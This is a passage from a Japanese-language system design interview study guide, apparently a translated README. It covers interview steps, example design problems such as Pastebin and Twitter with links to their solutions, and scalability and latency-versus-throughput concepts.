[\u5b9f\u4e16\u754c\u3067\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3](#\u5b9f\u4e16\u754c\u306e\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3) | :+1: | :+1: | :+1: |\n| \u5fa9\u7fd2\u3059\u308b [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u306b\u3069\u306e\u3088\u3046\u306b\u6e96\u5099\u3059\u308b\u304b](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u306b\u3069\u306e\u3088\u3046\u306b\u3057\u3066\u81e8\u3081\u3070\u3044\u3044\u304b) | :+1: | :+1: | :+1: |\n| \u3068\u308a\u3042\u3048\u305a\u4e00\u5468\u3059\u308b [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u8ab2\u984c\u4f8b](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u8ab2\u984c\u4f8b\u3068\u305d\u306e\u89e3\u7b54) | Some | Many | Most |\n| \u3068\u308a\u3042\u3048\u305a\u4e00\u5468\u3059\u308b [\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u8a2d\u8a08\u554f\u984c\u3068\u89e3\u7b54](#\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u8a2d\u8a08\u554f\u984c\u3068\u89e3\u7b54) | Some | Many | Most |\n| \u5fa9\u7fd2\u3059\u308b [\u305d\u306e\u4ed6\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u3067\u306e\u8cea\u554f\u4f8b](#\u4ed6\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u4f8b\u984c) | Some | Many | Most |\n\n## \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u306b\u3069\u306e\u3088\u3046\u306b\u3057\u3066\u81e8\u3081\u3070\u3044\u3044\u304b\n\n> \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8a66\u9a13\u554f\u984c\u306b\u3069\u306e\u3088\u3046\u306b\u53d6\u308a\u7d44\u3080\u304b\n\n\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u306f **open-ended conversation(Yes\/No\u3067\u306f\u7b54\u3048\u3089\u308c\u306a\u3044\u53e3\u982d\u8cea\u554f)\u3067\u3059**\u3002 \u81ea\u5206\u3067\u4f1a\u8a71\u3092\u7d44\u307f\u7acb\u3066\u308b\u3053\u3068\u3092\u6c42\u3081\u3089\u308c\u307e\u3059\u3002\n\n\u4ee5\u4e0b\u306e\u30b9\u30c6\u30c3\u30d7\u306b\u5f93\u3063\u3066\u8b70\u8ad6\u3092\u7d44\u307f\u7acb\u3066\u308b\u3053\u3068\u304c\u3067\u304d\u308b\u3067\u3057\u3087\u3046\u3002\u3053\u306e\u904e\u7a0b\u3092\u78ba\u304b\u306a\u3082\u306e\u306b\u3059\u308b\u305f\u3081\u306b\u3001\u6b21\u306e\u30bb\u30af\u30b7\u30e7\u30f3[\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u8ab2\u984c\u4f8b\u3068\u305d\u306e\u89e3\u7b54](#system-design-interview-questions-with-solutions) \u3092\u4ee5\u4e0b\u306e\u6307\u91dd\u306b\u5f93\u3063\u3066\u8aad\u307f\u8fbc\u3080\u3068\u3044\u3044\u3067\u3057\u3087\u3046\u3002\n\n### \u30b9\u30c6\u30c3\u30d7 1: \u305d\u306e\u30b7\u30b9\u30c6\u30e0\u4f7f\u7528\u4f8b\u306e\u6982\u8981\u3001\u5236\u7d04\u3001\u63a8\u8a08\u5024\u7b49\u3092\u805e\u304d\u51fa\u3057\u3001\u307e\u3068\u3081\u308b\n\n\u30b7\u30b9\u30c6\u30e0\u4ed5\u69d8\u306e\u8981\u6c42\u4e8b\u9805\u3092\u805e\u304d\u51fa\u3057\u3001\u554f\u984c\u7b87\u6240\u3092\u7279\u5b9a\u3057\u307e\u3057\u3087\u3046\u3002\u4f7f\u7528\u4f8b\u3068\u5236\u7d04\u3092\u660e\u78ba\u306b\u3059\u308b\u305f\u3081\u306e\u8cea\u554f\u3092\u6295\u3052\u304b\u3051\u307e\u3057\u3087\u3046\u3002\u8981\u6c42\u3059\u308b\u63a8\u8a08\u5024\u306b\u3064\u3044\u3066\u3082\u8b70\u8ad6\u3057\u3066\u304a\u304d\u307e\u3057\u3087\u3046\u3002\n\n* \u8ab0\u304c\u305d\u306e\u30b5\u30fc\u30d3\u30b9\u3092\u4f7f\u3046\u306e\u304b\uff1f\n* \u3069\u306e\u3088\u3046\u306b\u4f7f\u3046\u306e\u304b\uff1f\n* \u4f55\u4eba\u306e\u30e6\u30fc\u30b6\u30fc\u304c\u3044\u308b\u306e\u304b\uff1f\n* \u30b7\u30b9\u30c6\u30e0\u306f\u3069\u306e\u3088\u3046\u306a\u6a5f\u80fd\u3092\u679c\u305f\u3059\u306e\u304b\uff1f\n* \u30b7\u30b9\u30c6\u30e0\u3078\u306e\u5165\u529b\u3068\u51fa\u529b\u306f\uff1f\n* \u3069\u308c\u3060\u3051\u306e\u5bb9\u91cf\u306e\u30c7\u30fc\u30bf\u3092\u634c\u304f\u5fc5\u8981\u304c\u3042\u308b\u306e\u304b\uff1f\n* \u4e00\u79d2\u9593\u306b\u4f55\u30ea\u30af\u30a8\u30b9\u30c8\u306e\u9001\u4fe1\u304c\u60f3\u5b9a\u3055\u308c\u308b\u304b\uff1f\n* \u8aad\u307f\u66f8\u304d\u6bd4\u7387\u306e\u63a8\u5b9a\u5024\u306f\u3044\u304f\u3089\u7a0b\u5ea6\u304b\uff1f\n\n### \u30b9\u30c6\u30c3\u30d7 2: \u3088\u308a\u9ad8\u30ec\u30d9\u30eb\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u3092\u7d44\u307f\u7acb\u3066\u308b\n\n\u91cd\u8981\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3092\u5168\u3066\u8003\u616e\u3057\u305f\u9ad8\u30ec\u30d9\u30eb\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u6982\u8981\u3092\u7d44\u307f\u7acb\u3066\u308b\u3002\n\n* \u4e3b\u8981\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3068\u63a5\u7d9a\u3092\u30b9\u30b1\u30c3\u30c1\u3057\u3066\u66f8\u304d\u51fa\u3059\n* \u8003\u3048\u306e\u88cf\u4ed8\u3051\u3092\u3059\u308b\n\n### \u30b9\u30c6\u30c3\u30d7 3: \u6838\u3068\u306a\u308b\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u3092\u8a2d\u8a08\u3059\u308b\n\n\u305d\u308c\u305e\u308c\u306e\u4e3b\u8981\u306a\u30b3\u30f3\u30dd\u30fc\u30cd\u30f3\u30c8\u306b\u3064\u3044\u3066\u306e\u8a73\u7d30\u3092\u5b66\u3076\u3002\u4f8b\u3048\u3070\u3001[url\u77ed\u7e2e\u30b5\u30fc\u30d3\u30b9](solutions\/system_design\/pastebin\/README.md)\u306e\u8a2d\u8a08\u3092\u554f\u308f\u308c\u305f\u969b\u306b\u306f\u6b21\u306e\u3088\u3046\u306b\u3059\u308b\u3068\u3044\u3044\u3067\u3057\u3087\u3046:\n\n* \u5143\u306eURL\u306e\u30cf\u30c3\u30b7\u30e5\u5316\u3057\u305f\u3082\u306e\u3092\u4f5c\u308a\u3001\u305d\u308c\u3092\u4fdd\u5b58\u3059\u308b\n    * [MD5](solutions\/system_design\/pastebin\/README.md) \u3068 [Base62](solutions\/system_design\/pastebin\/README.md)\n    * \u30cf\u30c3\u30b7\u30e5\u885d\u7a81\n    * SQL \u3082\u3057\u304f\u306f NoSQL\n    * \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30b9\u30ad\u30fc\u30de\n* \u30cf\u30c3\u30b7\u30e5\u5316\u3055\u308c\u305fURL\u3092\u5143\u306eURL\u306b\u518d\u7ffb\u8a33\u3059\u308b\n    * \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u53c2\u7167\n* API & \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u306e\u8a2d\u8a08\n\n### \u30b9\u30c6\u30c3\u30d7 4: \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306e\u30b9\u30b1\u30fc\u30eb\n\n\u4e0e\u3048\u3089\u308c\u305f\u5236\u7d04\u6761\u4ef6\u304b\u3089\u30dc\u30c8\u30eb\u30cd\u30c3\u30af\u3068\u306a\u308a\u305d\u3046\u306a\u3068\u3053\u308d\u3092\u5272\u308a\u51fa\u3057\u3001\u660e\u78ba\u5316\u3059\u308b\u3002  \u4f8b\u3048\u3070\u3001\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306e\u554f\u984c\u89e3\u6c7a\u306e\u305f\u3081\u306b\u4ee5\u4e0b\u306e\u8981\u7d20\u3092\u8003\u616e\u3059\u308b\u5fc5\u8981\u304c\u3042\u308b\u3060\u308d\u3046\u304b\uff1f\n\n* \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\n* \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\n* \u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n* \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30b7\u30e3\u30fc\u30c7\u30a3\u30f3\u30b0\n\n\u53d6\u308a\u3046\u308b\u89e3\u6c7a\u7b56\u3068\u305d\u306e\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306b\u3064\u3044\u3066\u8b70\u8ad6\u3092\u3057\u3088\u3046\u3002\u5168\u3066\u306e\u3053\u3068\u306f\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306e\u95a2\u4fc2\u306b\u3042\u308b\u3002\u30dc\u30c8\u30eb\u30cd\u30c3\u30af\u306b\u3064\u3044\u3066\u306f[\u30b9\u30b1\u30fc\u30e9\u30d6\u30eb\u306a\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306e\u539f\u7406](#\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u76ee\u6b21)\u3092\u8aad\u3080\u3068\u3044\u3044\u3067\u3057\u3087\u3046\u3002\n\n### \u3061\u3087\u3063\u3068\u3057\u305f\u6697\u7b97\u554f\u984c\n\n\u3061\u3087\u3063\u3068\u3057\u305f\u63a8\u8a08\u5024\u3092\u624b\u8a08\u7b97\u3067\u3059\u308b\u3053\u3068\u3092\u6c42\u3081\u3089\u308c\u308b\u3053\u3068\u3082\u3042\u308b\u304b\u3082\u3057\u308c\u307e\u305b\u3093\u3002[\u88dc\u907a](#\u88dc\u907a)\u306e\u4ee5\u4e0b\u306e\u9805\u76ee\u304c\u5f79\u306b\u7acb\u3064\u3067\u3057\u3087\u3046:\n\n* [\u30c1\u30e9\u88cf\u8a08\u7b97\u3067\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u3059\u308b](http:\/\/highscalability.com\/blog\/2011\/1\/26\/google-pro-tip-use-back-of-the-envelope-calculations-to-choo.html)\n* [2\u306e\u4e57\u6570\u8868](#2\u306e\u4e57\u6570\u8868)\n* [\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u3063\u3066\u304a\u304f\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u306e\u53c2\u8003\u5024](#\u5168\u3066\u306e\u30d7\u30ed\u30b0\u30e9\u30de\u30fc\u304c\u77e5\u308b\u3079\u304d\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc\u5024)\n\n### \u6587\u732e\u3068\u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\n\n\u4ee5\u4e0b\u306e\u30ea\u30f3\u30af\u5148\u30da\u30fc\u30b8\u3092\u898b\u3066\u3069\u306e\u3088\u3046\u306a\u8cea\u554f\u3092\u6295\u3052\u304b\u3051\u3089\u308c\u308b\u304b\u6982\u8981\u3092\u982d\u306b\u5165\u308c\u3066\u304a\u304d\u307e\u3057\u3087\u3046:\n\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u3067\u6210\u529f\u3059\u308b\u306b\u306f\uff1f](https:\/\/www.palantir.com\/2011\/10\/how-to-rock-a-systems-design-interview\/)\n* [\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5](http:\/\/www.hiredintech.com\/system-design)\n* [\u30a2\u30fc\u30ad\u30c6\u30af\u30c1\u30e3\u3001\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u3078\u306e\u5c0e\u5165](https:\/\/www.youtube.com\/watch?v=ZgdS0EUmn70)\n\n## \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u8ab2\u984c\u4f8b\u3068\u305d\u306e\u89e3\u7b54\n\n> \u983b\u51fa\u306e\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u3068\u53c2\u8003\u89e3\u7b54\u3001\u30b3\u30fc\u30c9\u53ca\u3073\u30c0\u30a4\u30a2\u30b0\u30e9\u30e0\n>\n> \u89e3\u7b54\u306f `solutions\/` \u30d5\u30a9\u30eb\u30c0\u4ee5\u4e0b\u306b\u30ea\u30f3\u30af\u304c\u8cbc\u3089\u308c\u3066\u3044\u308b\n\n| \u554f\u984c | |\n|---|---|\n| Pastebin.com (\u3082\u3057\u304f\u306f Bit.ly) \u3092\u8a2d\u8a08\u3059\u308b| [\u89e3\u7b54](solutions\/system_design\/pastebin\/README.md) |\n| Twitter\u30bf\u30a4\u30e0\u30e9\u30a4\u30f3 (\u3082\u3057\u304f\u306fFacebook\u30d5\u30a3\u30fc\u30c9)\u3092\u8a2d\u8a08\u3059\u308b<br\/>Twitter\u691c\u7d22(\u3082\u3057\u304f\u306fFacebook\u691c\u7d22)\u6a5f\u80fd\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/twitter\/README.md) |\n| \u30a6\u30a7\u30d6\u30af\u30ed\u30fc\u30e9\u30fc\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/web_crawler\/README.md) |\n| Mint.com\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/mint\/README.md) |\n| SNS\u30b5\u30fc\u30d3\u30b9\u306e\u30c7\u30fc\u30bf\u69cb\u9020\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/social_graph\/README.md) |\n| \u691c\u7d22\u30a8\u30f3\u30b8\u30f3\u306e\u30ad\u30fc\/\u30d0\u30ea\u30e5\u30fc\u69cb\u9020\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/query_cache\/README.md) |\n| Amazon\u306e\u30ab\u30c6\u30b4\u30ea\u6bce\u306e\u58f2\u308a\u4e0a\u3052\u30e9\u30f3\u30ad\u30f3\u30b0\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/sales_rank\/README.md) |\n| AWS\u4e0a\u3067100\u4e07\u4eba\u898f\u6a21\u306e\u30e6\u30fc\u30b6\u30fc\u3092\u634c\u304f\u30b5\u30fc\u30d3\u30b9\u3092\u8a2d\u8a08\u3059\u308b | [\u89e3\u7b54](solutions\/system_design\/scaling_aws\/README.md) |\n| \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u554f\u984c\u3092\u8ffd\u52a0\u3059\u308b | [Contribute](#contributing) |\n\n### Pastebin.com (\u3082\u3057\u304f\u306f Bit.ly) \u3092\u8a2d\u8a08\u3059\u308b\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/pastebin\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/4edXG0T.png)\n\n### Twitter\u30bf\u30a4\u30e0\u30e9\u30a4\u30f3&\u691c\u7d22 (\u3082\u3057\u304f\u306fFacebook\u30d5\u30a3\u30fc\u30c9&\u691c\u7d22)\u3092\u8a2d\u8a08\u3059\u308b\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/twitter\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/jrUBAF7.png)\n\n### \u30a6\u30a7\u30d6\u30af\u30ed\u30fc\u30e9\u30fc\u306e\u8a2d\u8a08\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/web_crawler\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/bWxPtQA.png)\n\n### Mint.com\u306e\u8a2d\u8a08\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/mint\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/V5q57vU.png)\n\n### SNS\u30b5\u30fc\u30d3\u30b9\u306e\u30c7\u30fc\u30bf\u69cb\u9020\u3092\u8a2d\u8a08\u3059\u308b\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/social_graph\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/cdCv5g7.png)\n\n### \u691c\u7d22\u30a8\u30f3\u30b8\u30f3\u306e\u30ad\u30fc\/\u30d0\u30ea\u30e5\u30fc\u69cb\u9020\u3092\u8a2d\u8a08\u3059\u308b\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/query_cache\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/4j99mhe.png)\n\n### Amazon\u306e\u30ab\u30c6\u30b4\u30ea\u6bce\u306e\u58f2\u308a\u4e0a\u3052\u30e9\u30f3\u30ad\u30f3\u30b0\u3092\u8a2d\u8a08\u3059\u308b\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/sales_rank\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/MzExP06.png)\n\n### AWS\u4e0a\u3067100\u4e07\u4eba\u898f\u6a21\u306e\u30e6\u30fc\u30b6\u30fc\u3092\u634c\u304f\u30b5\u30fc\u30d3\u30b9\u3092\u8a2d\u8a08\u3059\u308b\n\n[\u554f\u984c\u3068\u89e3\u7b54\u3092\u898b\u308b](solutions\/system_design\/scaling_aws\/README.md)\n\n![Imgur](http:\/\/i.imgur.com\/jj3A5N8.png)\n\n## \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u8a2d\u8a08\u554f\u984c\u3068\u89e3\u7b54\n\n> \u983b\u51fa\u306e\u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u9762\u63a5\u8ab2\u984c\u3068\u53c2\u8003\u89e3\u7b54\u3001\u30b3\u30fc\u30c9\u53ca\u3073\u30c0\u30a4\u30a2\u30b0\u30e9\u30e0\n>\n> \u89e3\u7b54\u306f `solutions\/` \u30d5\u30a9\u30eb\u30c0\u4ee5\u4e0b\u306b\u30ea\u30f3\u30af\u304c\u8cbc\u3089\u308c\u3066\u3044\u308b\n\n>**\u5099\u8003: \u3053\u306e\u30bb\u30af\u30b7\u30e7\u30f3\u306f\u4f5c\u696d\u4e2d\u3067\u3059**\n\n| \u554f\u984c | |\n|---|---|\n| \u30cf\u30c3\u30b7\u30e5\u30de\u30c3\u30d7\u306e\u8a2d\u8a08 | [\u89e3\u7b54](solutions\/object_oriented_design\/hash_table\/hash_map.ipynb)  |\n| LRU\u30ad\u30e3\u30c3\u30b7\u30e5\u306e\u8a2d\u8a08 | [\u89e3\u7b54](solutions\/object_oriented_design\/lru_cache\/lru_cache.ipynb)  |\n| \u30b3\u30fc\u30eb\u30bb\u30f3\u30bf\u30fc\u306e\u8a2d\u8a08 | [\u89e3\u7b54](solutions\/object_oriented_design\/call_center\/call_center.ipynb)  |\n| \u30ab\u30fc\u30c9\u306e\u30c7\u30c3\u30ad\u306e\u8a2d\u8a08 | [\u89e3\u7b54](solutions\/object_oriented_design\/deck_of_cards\/deck_of_cards.ipynb)  |\n| \u99d0\u8eca\u5834\u306e\u8a2d\u8a08 | [\u89e3\u7b54](solutions\/object_oriented_design\/parking_lot\/parking_lot.ipynb)  |\n| \u30c1\u30e3\u30c3\u30c8\u30b5\u30fc\u30d0\u30fc\u306e\u8a2d\u8a08 | [\u89e3\u7b54](solutions\/object_oriented_design\/online_chat\/online_chat.ipynb)  |\n| \u5186\u5f62\u914d\u5217\u306e\u8a2d\u8a08 | [Contribute](#contributing)  |\n| \u30aa\u30d6\u30b8\u30a7\u30af\u30c8\u6307\u5411\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u554f\u984c\u3092\u8ffd\u52a0\u3059\u308b | [Contribute](#contributing) |\n\n## \u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u30c8\u30d4\u30c3\u30af\u30b9: \u307e\u305a\u306f\u3053\u3053\u304b\u3089\n\n\u30b7\u30b9\u30c6\u30e0\u8a2d\u8a08\u306e\u52c9\u5f37\u306f\u521d\u3081\u3066\uff1f\n\n\u307e\u305a\u521d\u3081\u306b\u3001\u3088\u304f\u4f7f\u308f\u308c\u308b\u8a2d\u8a08\u539f\u7406\u306b\u3064\u3044\u3066\u3001\u305d\u308c\u3089\u304c\u4f55\u3067\u3042\u308b\u304b\u3001\u3069\u306e\u3088\u3046\u306b\u7528\u3044\u3089\u308c\u308b\u304b\u3001\u9577\u6240\u77ed\u6240\u306b\u3064\u3044\u3066\u57fa\u672c\u7684\u306a\u77e5\u8b58\u3092\u5f97\u308b\u5fc5\u8981\u304c\u3042\u308a\u307e\u3059\n\n### \u30b9\u30c6\u30c3\u30d7 1: \u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u95a2\u3059\u308b\u52d5\u753b\u3092\u89b3\u3066\u5fa9\u7fd2\u3059\u308b\n\n[Harvard\u3067\u306e\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306e\u8b1b\u7fa9](https:\/\/www.youtube.com\/watch?v=-W9F__D3oY4)\n\n* \u3053\u3053\u3067\u89e6\u308c\u3089\u308c\u3066\u3044\u308b\u30c8\u30d4\u30c3\u30af\u30b9:\n    * \u5782\u76f4\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\n    * \u6c34\u5e73\u30b9\u30b1\u30fc\u30ea\u30f3\u30b0\n    * \u30ad\u30e3\u30c3\u30b7\u30f3\u30b0\n    * \u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b7\u30f3\u30b0\n    * \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30ec\u30d7\u30ea\u30b1\u30fc\u30b7\u30e7\u30f3\n    * \u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u30d1\u30fc\u30c6\u30a3\u30b7\u30e7\u30f3\n\n### \u30b9\u30c6\u30c3\u30d7 2: \u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u95a2\u3059\u308b\u8cc7\u6599\u3092\u8aad\u3093\u3067\u5fa9\u7fd2\u3059\u308b\n\n[\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3](http:\/\/www.lecloud.net\/tagged\/scalability\/chrono)\n\n* \u3053\u3053\u3067\u89e6\u308c\u3089\u308c\u3066\u3044\u308b\u30c8\u30d4\u30c3\u30af\u30b9:\n    * [\u30af\u30ed\u30fc\u30f3](http:\/\/www.lecloud.net\/post\/7295452622\/scalability-for-dummies-part-1-clones)\n    * [\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9](http:\/\/www.lecloud.net\/post\/7994751381\/scalability-for-dummies-part-2-database)\n    * [\u30ad\u30e3\u30c3\u30b7\u30e5](http:\/\/www.lecloud.net\/post\/9246290032\/scalability-for-dummies-part-3-cache)\n    * [\u975e\u540c\u671f](http:\/\/www.lecloud.net\/post\/9699762917\/scalability-for-dummies-part-4-asynchronism)\n\n### \u6b21\u306e\u30b9\u30c6\u30c3\u30d7\n\n\u6b21\u306b\u3001\u30cf\u30a4\u30ec\u30d9\u30eb\u3067\u306e\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306b\u3064\u3044\u3066\u307f\u3066\u3044\u304f:\n\n* **\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9** vs **\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3**\n* **\u30ec\u30a4\u30c6\u30f3\u30b7** vs **\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8**\n* **\u53ef\u7528\u6027** vs **\u4e00\u8cab\u6027**\n\n**\u5168\u3066\u306f\u30c8\u30ec\u30fc\u30c9\u30aa\u30d5\u306e\u95a2\u4fc2\u306b\u3042\u308b**\u3068\u3044\u3046\u306e\u3092\u809d\u306b\u547d\u3058\u3066\u304a\u304d\u307e\u3057\u3087\u3046\u3002\n\n\u305d\u308c\u304b\u3089\u3001\u3088\u308a\u6df1\u3044\u5185\u5bb9\u3001DNS\u3084CDN\u305d\u3057\u3066\u30ed\u30fc\u30c9\u30d0\u30e9\u30f3\u30b5\u30fc\u306a\u3069\u306b\u3064\u3044\u3066\u5b66\u7fd2\u3092\u9032\u3081\u3066\u3044\u304d\u307e\u3057\u3087\u3046\u3002\n\n## \u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9 vs \u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\n\n\u30ea\u30bd\u30fc\u30b9\u304c\u8ffd\u52a0\u3055\u308c\u308b\u306e\u306b\u3064\u308c\u3066 **\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9** \u304c\u5411\u4e0a\u3059\u308b\u5834\u5408\u305d\u306e\u30b5\u30fc\u30d3\u30b9\u306f **\u30b9\u30b1\u30fc\u30e9\u30d6\u30eb** \u3067\u3042\u308b\u3068\u8a00\u3048\u308b\u3067\u3057\u3087\u3046\u3002\u4e00\u822c\u7684\u306b\u3001\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9\u3092\u5411\u4e0a\u3055\u305b\u308b\u3068\u3044\u3046\u306e\u306f\u3059\u306a\u308f\u3061\u8a08\u7b97\u51e6\u7406\u3092\u5897\u3084\u3059\u3053\u3068\u3092\u610f\u5473\u3057\u307e\u3059\u304c\u3001\u30c7\u30fc\u30bf\u30bb\u30c3\u30c8\u304c\u5897\u3048\u305f\u6642\u306a\u3069\u3088\u308a\u5927\u304d\u306a\u51e6\u7406\u3092\u634c\u3051\u308b\u3088\u3046\u306b\u306a\u308b\u3053\u3068\u3067\u3082\u3042\u308a\u307e\u3059\u3002<sup><a href=http:\/\/www.allthingsdistributed.com\/2006\/03\/a_word_on_scalability.html>1<\/a><\/sup>\n\n\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9vs\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u3092\u3068\u3089\u3048\u308b\u4ed6\u306e\u8003\u3048\u65b9:\n\n* **\u30d1\u30d5\u30a9\u30fc\u30de\u30f3\u30b9** \u3067\u306e\u554f\u984c\u3092\u62b1\u3048\u3066\u3044\u308b\u6642\u3001\u3042\u306a\u305f\u306e\u30b7\u30b9\u30c6\u30e0\u306f\u4e00\u4eba\u306e\u30e6\u30fc\u30b6\u30fc\u306b\u3068\u3063\u3066\u9045\u3044\u3068\u8a00\u3048\u308b\u3067\u3057\u3087\u3046\u3002\n* **\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3** \u3067\u306e\u554f\u984c\u3092\u62b1\u3048\u3066\u3044\u308b\u3068\u304d\u3001\u4e00\u4eba\u306e\u30e6\u30fc\u30b6\u30fc\u306b\u3068\u3063\u3066\u306f\u901f\u3044\u3067\u3059\u304c\u3001\u591a\u304f\u306e\u30ea\u30af\u30a8\u30b9\u30c8\u304c\u3042\u308b\u6642\u306b\u306f\u9045\u304f\u306a\u3063\u3066\u3057\u307e\u3046\u3067\u3057\u3087\u3046\u3002\n\n### \u305d\u306e\u4ed6\u306e\u53c2\u8003\u8cc7\u6599\u3001\u30da\u30fc\u30b8\n\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u306b\u3064\u3044\u3066](http:\/\/www.allthingsdistributed.com\/2006\/03\/a_word_on_scalability.html)\n* [\u30b9\u30b1\u30fc\u30e9\u30d3\u30ea\u30c6\u30a3\u3001\u53ef\u7528\u6027\u3001\u5b89\u5b9a\u6027\u3001\u30d1\u30bf\u30fc\u30f3](http:\/\/www.slideshare.net\/jboner\/scalability-availability-stability-patterns\/)\n\n## \u30ec\u30a4\u30c6\u30f3\u30b7\u30fc vs \u30b9\u30eb\u30fc\u30d7\u30c3\u30c8\n\n**\u30ec\u30a4\u30c6\u30f3\u30b7\u30fc** \u3068\u306f\u306a\u306b\u304c\u3057\u304b\u306e\u52d5\u4f5c\u3092\u884c\u3046\u3001\u3082\u3057\u304f\u306f\u7d50\u679c\u3092\u7b97\u51fa\u3059\u308b\u306e\u306b\u8981\u3059\u308b\u6642\u9593\n\n**\u30b9\u30eb\u30fc\u30d7\u30c3\u30c8** \u3068\u306f\u305d\u306e\u3088\u3046\u306a\u52d5\u4f5c\u3084\u7d50\u679c\u7b97\u51fa\u304c\u5358\u4f4d\u6642\u9593\u306b\u884c\u308f\u308c\u308b\u56de\u6570\n\n\u4e00\u822c\u7684\u306b\u3001 